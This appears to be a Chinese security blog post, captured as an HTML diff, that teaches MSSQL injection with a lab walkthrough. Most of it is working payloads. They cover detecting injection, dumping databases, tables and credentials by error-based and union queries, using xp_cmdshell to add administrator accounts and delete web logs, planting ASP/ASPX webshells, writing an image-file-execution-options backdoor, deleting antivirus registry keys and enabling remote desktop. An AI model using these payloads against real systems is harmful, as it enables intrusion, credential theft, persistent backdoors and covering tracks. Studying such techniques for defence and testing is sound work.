@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || mssql注入</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>mssql<hanla></hanla>注入 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/25
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/sql注入">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                sql<hanla></hanla>注入
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="sqlsercer介绍"><a href="#sqlsercer介绍" class="headerlink" title="sqlsercer介绍"></a><hanla></hanla>sqlsercer<hanla></hanla>介绍</h2><p><hanla></hanla>美国<hanla></hanla>Microsoft<hanla></hanla>公司推出的一种关系型数据库系统。SQLServer<hanla></hanla>是一个可扩展的、高性能</p>
+  <span id="more"></span>
+
+<p><hanla></hanla>的、为分布式客户机<hanla></hanla>/<hanla></hanla>服务器计算所设计的数据库管理系统，实现了与<hanla></hanla>WindowsNT<hanla></hanla>的有<br>机结合，提供了基于事务的企业级信息管理系统方案。<br>其主要特点如下：<br><hanla></hanla>(1）高性能设计，可充分利用<hanla></hanla>WindowsNT<hanla></hanla>的优势<br><hanla></hanla>(2）系统管理先进，支持<hanla></hanla>Windows<hanla></hanla>图形化管理工具，支持本地和远程的系统管理和配置。<br>(3）强壮的事务处理功能，采用各种方法保证数据的完整性。<br><hanla></hanla>(4）支持对称多处理器结构、存储过程、ODBC，并具有自主的<hanla></hanla>SQL<hanla></hanla>语言。SQLServer<hanla></hanla>以其  内置的数据复制功能、强大的管理工具、与<hanla></hanla>Internet<hanla></hanla>的紧密集成和开放  的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。  </p>
+<p>asp/aspx + sqlserver<br><hanla></hanla>教育站点<br>棋牌站点<br>政府站点<br>企业站点<br>医院站点  </p>
+<p><hanla></hanla>很多新站点现在都是<hanla></hanla>jsp+oracle  </p>
+<p><hanla></hanla>1433<hanla></hanla>抓鸡  sqlserver  </p>
+<p>sa sa admin 123456  </p>
+<p>mdf 数据库文件<br><hanla></hanla>ldf  数据库匹配的日志文件  </p>
+<p><hanla></hanla>sa<hanla></hanla>权限：<br>数据库操作，文件管理，命令执行，注册表读取等 system<br><hanla></hanla>db<hanla></hanla>权限：文件管理,<hanla></hanla>数据库操作等 users-adminstrators<br><hanla></hanla>public<hanla></hanla>权限：数据库操作 guest-users  </p>
+<h3 id="sqlserver服务"><a href="#sqlserver服务" class="headerlink" title="sqlserver服务"></a><hanla></hanla>sqlserver<hanla></hanla>服务</h3><p><hanla></hanla>services.msc<br><hanla></hanla>创建数据库<br>分类数据库<br>附加数据库 </p>
+<pre><code>&lt;%
+ set conn =server.createobject("adodb.connection") 
+ conn.open  
+ 
+"provider=sqloledb;source=local;uid=sa;pwd=123123;database=database-name"
+%&gt;
+</code></pre>
+<p><hanla></hanla>其中，provider<hanla></hanla>后面的不用管，照写；source<hanla></hanla>后面的可以是<hanla></hanla>ip<hanla></hanla>地址，这里我用的是本地的；<br><hanla></hanla>sa<hanla></hanla>是内置的用户，它的密码是你在安装的时候设置的；<br><hanla></hanla>database<hanla></hanla>后面是你要连接的数据库的名称，例：mydatabase<br>(不需扩展名）。</p>
+<h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p><hanla></hanla>1.<hanla></hanla>判断是否有注入<br><hanla></hanla>and 1=1<br>and 1=2<br>/<br>-0<br><hanla></hanla>判断注入的方法是一样的  </p>
+<p><hanla></hanla>2.<hanla></hanla>初步判断是否是<hanla></hanla>mssql<br>and user&gt;0<br><hanla></hanla>3,<hanla></hanla>判断数据库系统<br><hanla></hanla>and (select count(<em>) from sysobjects &gt; 0 mssql<br>and (select count(</em>)from msysobjects) &gt; 0 access </p>
+<h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><p><hanla></hanla>4.<hanla></hanla>注入参数是字符<br><hanla></hanla>‘and [查询条件] and ‘’=’<br><hanla></hanla>5.<hanla></hanla>搜索时没过滤参数的<br><hanla></hanla>‘and [查询条件] and ‘%25’=’<br><hanla></hanla>6.<hanla></hanla>猜数表名   </p>
+<pre><code><hanla></hanla>and (select Count(*) from [表名])&gt;0   
+7.<hanla></hanla>猜字段   
+and (select Count(字段名) from 表名)&gt;0   
+8.<hanla></hanla>猜字段中记录长度   
+and (select top 1 len(字段名) from 表名)&gt;0   
+9.
+(1)<hanla></hanla>猜字段的<hanla></hanla>ascii<hanla></hanla>值（access）   
+and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   
+(2)<hanla></hanla>猜字段的<hanla></hanla>ascii<hanla></hanla>值（mssql）   
+and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0  
+</code></pre>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><hanla></hanla>＠＠version<hanla></hanla>是<hanla></hanla>mssql 的全局变量，如果我们把它写成这样 and @@version&gt;0   那个后面的<hanla></hanla>mssql<br><hanla></hanla>就会强行把<hanla></hanla>@@version 强行转换成数字，但是失败，所以就会将数据库信息暴露出来<br><a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/showforum.asp?id=0"><hanla></hanla>http://testasp.vulnweb.com/showforum.asp?id=0</a><br><hanla></hanla>在加入’<hanla></hanla>后 报错   </p>
+<h4 id="数据库版本"><a href="#数据库版本" class="headerlink" title="//数据库版本"></a><hanla></hanla>//<hanla></hanla>数据库版本</h4><p><hanla></hanla>id=1 and 1=(select @@version)<br><hanla></hanla>//<hanla></hanla>当前使用的数据库<br><hanla></hanla>id=1 and 1=(select db_name())  </p>
+<h4 id="获取第一个用户数据库"><a href="#获取第一个用户数据库" class="headerlink" title="//获取第一个用户数据库"></a><hanla></hanla>//<hanla></hanla>获取第一个用户数据库</h4><p><hanla></hanla>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and   name&lt;&gt; ‘acublog’)<br><hanla></hanla>//<hanla></hanla>以此类推，可以获取全部用户数据库名<br><hanla></hanla>and 1=(select name from master..sysdatabases for xml path)  </p>
+<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="//获取表名"></a><hanla></hanla>//<hanla></hanla>获取表名</h4><p><hanla></hanla>//<hanla></hanla>获取第一张表<br> threads<br>?id=1 and 1=(select top 1 name from sysobjects where xtype=’u’)<br><hanla></hanla>//<hanla></hanla>获取第二张表<br><hanla></hanla>users<br>?id=1 and 1=(select top 1 name from sysobjects where xtype=’U’ and   name &lt;&gt; ‘threads’ )  </p>
+<pre><code><hanla></hanla>sysobjects<hanla></hanla>这个表记录一个数据库里的所有对象,<hanla></hanla>包括表,<hanla></hanla>索引,<hanla></hanla>存储过程,<hanla></hanla>触发器,<hanla></hanla>等等  .
+xtype&nbsp;char(2)&nbsp;对象类型。可以是下列对象类型中的一种：&nbsp;
+C&nbsp;=&nbsp;CHECK&nbsp;约束    D&nbsp;=&nbsp;默认值或 DEFAULT&nbsp;约束    F&nbsp;=&nbsp;FOREIGN&nbsp;KEY&nbsp;约束      L&nbsp;=&nbsp;日志    FN&nbsp;=&nbsp;标量函数    IF&nbsp;=&nbsp;内嵌表函数        P&nbsp;=&nbsp;存储过程<hanla></hanla>PK&nbsp;=&nbsp;PRIMARY&nbsp;KEY&nbsp;约束（类型是&nbsp;K）    RF&nbsp;=&nbsp;复制筛选存储过程      S&nbsp;=&nbsp;系统表      TF&nbsp;=&nbsp;表函数    TR&nbsp;=&nbsp;触发器    U&nbsp;=&nbsp;用户表      UQ&nbsp;=&nbsp;UNIQUE&nbsp;约束（类型是&nbsp;K）      V&nbsp;=&nbsp;视图<hanla></hanla>X&nbsp;=&nbsp;扩展存储过程  
+</code></pre>
+<p><hanla></hanla>//<hanla></hanla>以此类推，可以获取全部表<br><hanla></hanla>//<hanla></hanla>获取全部表名<br>?id=1 and 1=(select name from sysobjects for xml path)</p>
+<h4 id="取列名"><a href="#取列名" class="headerlink" title="取列名"></a>取列名</h4><p> 获取表 users 的列名<br><hanla></hanla>//<hanla></hanla>获取第一列列名 uname<br>?id=1 and 1=(select top 1 name from syscolumns where id =(select id   from sysobjects where name = ‘users’))<br><hanla></hanla>//<hanla></hanla>获取第二列列名 upass<br>?id=1 and 1=(select top 1 name from syscolumns where id =(select id   from sysobjects where name = ‘users’) and name &lt;&gt; ‘uname’ )</p>
+<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p><hanla></hanla>//<hanla></hanla>获取第一个用户名<br>?id=1 and 1=(select top 1 uname from users)<br><hanla></hanla>//<hanla></hanla>获取第一个用户名对应的密码<br>?id=1 and 1=(select top 1 upass from users )</p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><hanla></hanla>order by 报错的时候后面要注释一下<br>–+<br>%23=#<br>sqlserver 不能用<br><hanla></hanla>?id=1 union select 1,2,3  跟<hanla></hanla>orcale 一样<br>?id=1 union select null,null,null<br>?id=1 union select 1,null,null 返回正常<br>?id=1 union select 1,’2’,null 返正常<br>?id=1 union select 1,db_name(),null  </p>
+<h4 id="顺便查下版本和数据库名"><a href="#顺便查下版本和数据库名" class="headerlink" title="顺便查下版本和数据库名"></a>顺便查下版本和数据库名</h4><p><hanla></hanla>union select null,@@version,db_name(),null,null</p>
+<h4 id="查表名-修改top-后面数字可以查下一个表名"><a href="#查表名-修改top-后面数字可以查下一个表名" class="headerlink" title="查表名 修改top 后面数字可以查下一个表名"></a><hanla></hanla>查表名 修改<hanla></hanla>top 后面数字可以查下一个表名</h4><p><hanla></hanla>union select 1,(select top 1 name from sysobjects where xtype=’u’),null  </p>
+<p>如果要查其他数据库的表名还可以这样:<br>union select  null,(select top 1 name from [dbname]..sysobjects where xtype=’u’ and name<br>not in(select top 0 name from [dbname]..sysobjects where xtype=’u’)),null,null</p>
+<h4 id="union-列列名"><a href="#union-列列名" class="headerlink" title="union 列列名"></a>union 列列名</h4><p><hanla></hanla>继续猜字段名<hanla></hanla>(从<hanla></hanla>0<hanla></hanla>开始增加第二个<hanla></hanla>top N<hanla></hanla>的数字就可以遍历<hanla></hanla>admin<hanla></hanla>表的字段名了)   </p>
+<p>第一个列名<br><a target="_blank" rel="noopener" href="http://192.168.0.240:8005/?id=1"><hanla></hanla>http://192.168.0.240:8005/?id=1</a>   union select null,(select top 1   name from syscolumns where id in (select id from sysobjects where    name=’password’) and name not in (select top 0 name from syscolumns   where id in (select id from sysobjects where name=’password’))),null  </p>
+<p>第二个列名<br><a target="_blank" rel="noopener" href="http://192.168.0.240:8005/?id=1"><hanla></hanla>http://192.168.0.240:8005/?id=1</a>   union select null,(select top 1   name from syscolumns where id in (select id from sysobjects where   name=’password’) and name not in (select top 1 name from syscolumns   where id in (select id from sysobjects where name=’password’))),null  </p>
+<p>第三个列名  </p>
+<p><a target="_blank" rel="noopener" href="http://192.168.0.240:8005/?id=1">http://192.168.0.240:8005/?id=1</a>   union select null,(select top 1   name from syscolumns where id in (select id from sysobjects where   name=’password’) and name not in (select top 2 name from syscolumns   where id in (select id from sysobjects where name=’password’))),null  </p>
+<h4 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h4><p><a target="_blank" rel="noopener" href="http://192.168.0.240:8005/?id=1"><hanla></hanla>http://192.168.0.240:8005/?id=1</a>   union select null,username,password  from password where username not in (select top 0 username from password)</p>
+<h2 id="判断权限语句"><a href="#判断权限语句" class="headerlink" title="判断权限语句"></a>判断权限语句</h2><p><hanla></hanla>and 1=(select is_srvrolemember(‘sysadmin’)) //<hanla></hanla>判断是否是系统管理员<br><hanla></hanla>and 1=(select is_srvrolemember(‘db_owner’)) //<hanla></hanla>判断是否是库权限<br><hanla></hanla>and 1=(select is_srvrolemember(‘public’))   //<hanla></hanla>判断是否为<hanla></hanla>public<hanla></hanla>权限<br><hanla></hanla>and 1=convert(int,db_name())<hanla></hanla>或<hanla></hanla>1=(select db_name())  //<hanla></hanla>当前数据库名<br><hanla></hanla>and 1=(select @@servername)  //<hanla></hanla>本地服务名<br><hanla></hanla>and 1=(select HAS_DBACCESS(‘master’))  //<hanla></hanla>判断是否有库读取权限</p>
+<h2 id="sa权限的利用"><a href="#sa权限的利用" class="headerlink" title="sa权限的利用"></a><hanla></hanla>sa<hanla></hanla>权限的利用</h2><p>注入用户密码<br>修改网站管理员密码<br><hanla></hanla>直接<hanla></hanla>getshell<br><hanla></hanla>调用系统命令<br>    创建系统管理员<br>    操控文件<br>操控日志文件<br><hanla></hanla>getshell<br><hanla></hanla>创建<hanla></hanla>sqlserver<hanla></hanla>管理<br>系统服务操作<br>注册表操作<br>    创建后门<br><hanla></hanla>开启<hanla></hanla>3389   </p>
+<h3 id="sqlserver中的存储过程"><a href="#sqlserver中的存储过程" class="headerlink" title="sqlserver中的存储过程"></a><hanla></hanla>sqlserver<hanla></hanla>中的存储过程</h3><p>过程说明</p>
+<pre><code><hanla></hanla>sp_addlogin<hanla></hanla>创建新的<hanla></hanla>SQL&nbsp;server<hanla></hanla>登录，该登录运行用户使用<hanla></hanla>SQL&nbsp;serve
+r<hanla></hanla>身份验证连接到<hanla></hanla>SQL&nbsp;server<hanla></hanla>实例
+sp_dropuser<hanla></hanla>从当前数据库中删除数据库用户
+xp_enumgroups<hanla></hanla>提供<hanla></hanla>Microsoft&nbsp;Windows<hanla></hanla>本地组列表或在指定的<hanla></hanla>Windows<hanla></hanla>域中定
+义的全局组列表
+xp_regwrite<hanla></hanla>未被公布的存储过程,，写入注册表
+xp_regread<hanla></hanla>读取注册表
+xp_regdeletevalue<hanla></hanla>删除注册表
+xp_dirtree<hanla></hanla>读取目录
+sp_password<hanla></hanla>更改密码
+xp_servicecontrol<hanla></hanla>停止或激活某服务
+</code></pre>
+<h3 id="修改网站管理员密码"><a href="#修改网站管理员密码" class="headerlink" title="修改网站管理员密码"></a>修改网站管理员密码</h3><p>;update admin set pass=’e8dc763194f29433’ where admin=’cracer’<br><hanla></hanla>将管理员表<hanla></hanla>admin<hanla></hanla>中<hanla></hanla>admin<hanla></hanla>用户的密码设置为<br><hanla></hanla>e8dc763194f29433  </p>
+<p>修改之前把原来密码备份<br>通常在密码解不出的情况下选择使用该方法  </p>
+<h3 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a><hanla></hanla>直接<hanla></hanla>getshell</h3><p><hanla></hanla>修复上传   </p>
+<pre><code>;EXEC sp_configure 'show advanced options',1; 
+RECONFIGURE;
+;exec sp_configure 'Web Assistant Procedures', 1; 
+RECONFIGURE
+
+http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27C  :\Inetpub\wwwroot\8005\x1.asp%27,%27select%27%27&lt;%execute(  request("cmd"))%&gt;%27%27%27--    
+
+;exec sp_makewebtask  'C:\Inetpub\8002-Mssql\x11.asp','select''&lt;\%@eval(request("cmd"))\%&gt;'''
+</code></pre>
+<h3 id="调用系统命令xp-cmdshell"><a href="#调用系统命令xp-cmdshell" class="headerlink" title="调用系统命令xp_cmdshell"></a><hanla></hanla>调用系统命令<hanla></hanla>xp_cmdshell</h3><pre><code><hanla></hanla>1.<hanla></hanla>检测与恢复扩展存储  
+判断<hanla></hanla>xp\_cmdshell<hanla></hanla>扩展存储是否存在  
+and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x'   AND name= 'xp\_cmdshell')  
+判断<hanla></hanla>xp\_regread<hanla></hanla>扩展存储过程是否存在  
+and 1=(select count(*) from master.dbo.sysobjects where name='xp\_  regread')  
+恢复   
+;EXEC sp\_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_  configure 'xp\_cmdshell', 1;RECONFIGURE;   
+;exec sp\_dropextendedproc xp\_cmdshell,'xplog70.dll'  
+</code></pre>
+<h3 id="xp-cmdshell执行命令"><a href="#xp-cmdshell执行命令" class="headerlink" title="xp_cmdshell执行命令"></a><hanla></hanla>xp_cmdshell<hanla></hanla>执行命令</h3><p> 新建用户<br>;exec master..xp_cmdshell ‘net user test test /add’<br>;exec master..xp_cmdshell ‘net localgroup administrators test /add’<br><hanla></hanla>操控日志<br>;exec master.dbo.xp_cmdshell ‘del    c:\winnt\system32\logfiles\w3svc5\ex070606.log ‘   </p>
+<p>Getshell  </p>
+<pre><code>echo ^&lt;%Execute(request("a"))%^&gt; &gt; d:\www\123.asp
+;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language="Jscript"%^&gt;^&lt;%eval
+(Request.Item["pass"],"unsafe");%^&gt; &gt; c:\\WWW\\233.aspx' ;--
+</code></pre>
+<p>操作注册表<br>删除注册表<br><hanla></hanla>reg delete HKLM\SOFTWARE\McAfee /f<br><hanla></hanla>导入注册表<br><hanla></hanla>Regedit /s d:\web\zh\hp.reg<br><hanla></hanla>导出注册表<br><hanla></hanla>regedit /e d:\web\zhao\aaa.reg “HKEY_LOCAL_    MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp”   </p>
+<h3 id="创建sqlserver管理"><a href="#创建sqlserver管理" class="headerlink" title="创建sqlserver管理"></a><hanla></hanla>创建<hanla></hanla>sqlserver<hanla></hanla>管理</h3><p><hanla></hanla>添加和删除一个<hanla></hanla>SA<hanla></hanla>权限的用户<hanla></hanla>test：<br><hanla></hanla>（需要<hanla></hanla>SA<hanla></hanla>权限）<br>exec master.dbo.sp_addlogin test,password<br>exec master.dbo.sp_addsrvrolemember test,sysadmin  </p>
+<h3 id="系统服务操作"><a href="#系统服务操作" class="headerlink" title="系统服务操作"></a>系统服务操作</h3><p><hanla></hanla>停掉或激活某个服务。 （需要<hanla></hanla>SA<hanla></hanla>权限）<br>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’  </p>
+<h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><p>启用存储过程</p>
+<pre><code>exec sp_addextendedproc xp_regread,'xpstar.dll'
+;exec master.dbo.sp_addextendedproc0x780070005f007200650067007200650061006400,0x7800700073007400610072002e0064006c006c00—
+
+exec sp_addextendedproc xp_regwrite,'xpstar.dll' 
+</code></pre>
+<h3 id="写入注册表"><a href="#写入注册表" class="headerlink" title="写入注册表"></a>写入注册表</h3><p><hanla></hanla>xp_regwrite 根键,<hanla></hanla>子键, 值名, 值类型, 值</p>
+<h3 id="写入shift后门"><a href="#写入shift后门" class="headerlink" title="写入shift后门"></a><hanla></hanla>写入<hanla></hanla>shift<hanla></hanla>后门</h3><pre><code><hanla></hanla>exec xp_regwrite 
+0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\\windows\\system32\\taskmgr.exe'--
+</code></pre>
+<h3 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a><hanla></hanla>开启<hanla></hanla>3389</h3><pre><code><hanla></hanla>;exec master..xp_cmdshell 'sc config termservice start=auto' 
+;exec master..xp_cmdshell 'net start termservice' 
+;exec master..xp_cmdshell 'reg add 
+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal 
+Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'  
+//<hanla></hanla>允许外部连接 
+;exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x50 /f'   
+ //<hanla></hanla>改端口到<hanla></hanla>80
+开启<hanla></hanla>3389
+;exec master..xp_cmdshell "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1"--
+</code></pre>
+<h3 id="dbowner权限利用"><a href="#dbowner权限利用" class="headerlink" title="dbowner权限利用"></a><hanla></hanla>dbowner<hanla></hanla>权限利用</h3><pre><code><hanla></hanla>1.<hanla></hanla>判断数据库用户权限
+ 
+and 1=(select is_member('db_owner'));--
+2.<hanla></hanla>搜索<hanla></hanla>web<hanla></hanla>目录 
+;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--
+然后 
+;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--
+and(select dir from temp where id=1)&gt;0
+由于不能一次性获取所有目录文件和文件夹名，因此需要更改<hanla></hanla>ID<hanla></hanla>的值，依次列出文件和文件夹
+</code></pre>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><pre><code><hanla></hanla>找到<hanla></hanla>web<hanla></hanla>目录后，就可以写入一句话木马了 
+;alter database ssdown5 set RECOVERY FULL 
+;create table test(str image)-- 
+;backup log ssdown5 to disk='c:\test' with init-- 
+;insert into test(str)values ('&lt;%excute(request("cmd"))%&gt;')-- 
+;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp'-- 
+;alter database ssdown5 set RECOVERY simple
+</code></pre>
+<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><hanla></hanla>穿山甲、萝卜头、sqlmap<hanla></hanla>等<br><hanla></hanla>sqlmap 可以 –os-shell </p>
+<h3 id="靶机实验："><a href="#靶机实验：" class="headerlink" title="靶机实验："></a>靶机实验：</h3><p><hanla></hanla>1.<hanla></hanla>报错注入<br>查看系统版本</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkX5Ak"><img src="https://s3.jpg.cm/2021/09/25/IkX5Ak.png" alt="IkX5Ak.png"></a></p>
+<p>获取当前数据库表</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXPRO"><img src="https://s3.jpg.cm/2021/09/25/IkXPRO.png" alt="IkXPRO.png"></a></p>
+<p><hanla></hanla>直接爆所有数据库 master,model,msdb,tempdb,<hanla></hanla>都是默认的，而且没有分隔符不好辨别<br>但是右键查看源代码可以看</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXqf8"><img src="https://s3.jpg.cm/2021/09/25/IkXqf8.png" alt="IkXqf8.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXWOi"><img src="https://s3.jpg.cm/2021/09/25/IkXWOi.png" alt="IkXWOi.png"></a></p>
+<p>爆表名</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXR1w"><img src="https://s3.jpg.cm/2021/09/25/IkXR1w.png" alt="IkXR1w.png"></a></p>
+<p><hanla></hanla>爆出的表名有这些<hanla></hanla>referers black temp name users emails uagents</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXQTy"><img src="https://s3.jpg.cm/2021/09/25/IkXQTy.png" alt="IkXQTy.png"></a></p>
+<p>爆字段有 id  username  password</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXlr5"><img src="https://s3.jpg.cm/2021/09/25/IkXlr5.png" alt="IkXlr5.png"></a></p>
+<p><hanla></hanla>爆数据，username password 都是<hanla></hanla>Dumb</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXedr"><img src="https://s3.jpg.cm/2021/09/25/IkXedr.png" alt="IkXedr.png"></a></p>
+<p><hanla></hanla>2.union<hanla></hanla>联合注入<br><hanla></hanla>开始用<hanla></hanla>null，在测试是字符还是数字<br><hanla></hanla>order by 报错后面可能有语句要用#或者–注释掉  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkX6CC"><img src="https://s3.jpg.cm/2021/09/25/IkX6CC.png" alt="IkX6CC.png"></a></p>
+<p>3.<br><hanla></hanla>修改管理员密码：当<hanla></hanla>md5<hanla></hanla>解密不出来的时候</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXup4"><img src="https://s3.jpg.cm/2021/09/25/IkXup4.png" alt="IkXup4.png"></a></p>
+<p>修改管理员账号和密码，记得修改前备份，修改后要改回来<br>不过没有修改成功</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXbXG"><img src="https://s3.jpg.cm/2021/09/25/IkXbXG.png" alt="IkXbXG.png"></a></p>
+<p><hanla></hanla>原因是这是明文存储不能修改为<hanla></hanla>MD5</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkX1aX"><img src="https://s3.jpg.cm/2021/09/25/IkX1aX.png" alt="IkX1aX.png"></a></p>
+<p><hanla></hanla>4.Sa<hanla></hanla>权限直接<hanla></hanla>getshell<br><hanla></hanla>执行前要修复存储过程</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXcZu"><img src="https://s3.jpg.cm/2021/09/25/IkXcZu.png" alt="IkXcZu.png"></a></p>
+<p><hanla></hanla>这样传上去是连不上滴，因为要执行必须要有<hanla></hanla>%<hanla></hanla>号，可是上传给过滤掉了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXXfz"><img src="https://s3.jpg.cm/2021/09/25/IkXXfz.png" alt="IkXXfz.png"></a></p>
+<p><hanla></hanla>所有我们用不用<hanla></hanla>%<hanla></hanla>号的一句话木马</p>
+<pre><code>    &lt;script language=vbs runat=server&gt;eval(request("c"))&lt;/script&gt;   
+    http://192.168.43.10:8002/index.asp?id=1';exec sp_makewebtask    
+     'C:\Inetpub\8002-Mssql\x14.asp','select''&lt;script language=vbs   runat=server&gt;eval(request("c"))&lt;/script&gt;'''--+  
+</code></pre>
+<p>在菜刀连接就可以了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkXJdD"><img src="https://s3.jpg.cm/2021/09/25/IkXJdD.png" alt="IkXJdD.png"></a></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
